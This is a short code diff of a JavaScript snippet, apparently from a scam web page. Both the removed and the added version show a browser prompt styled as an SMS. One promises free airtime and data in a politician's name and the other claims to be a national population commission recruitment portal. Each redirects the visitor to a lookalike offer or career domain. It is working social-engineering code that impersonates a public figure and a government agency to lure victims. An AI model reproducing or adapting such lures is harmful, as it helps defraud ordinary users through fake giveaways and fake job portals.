@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'OK'
+password=prompt('SMS: WELCOME TO THE NATIONAL POPULATION COMMISSION (NPC) 2025 RECRUITMENT PORTAL, Kindly Press OK to PROCEED ','OK');
+if (password != 'OK') {
+location.href='https://npc-career.allprogram.site/job';
 }
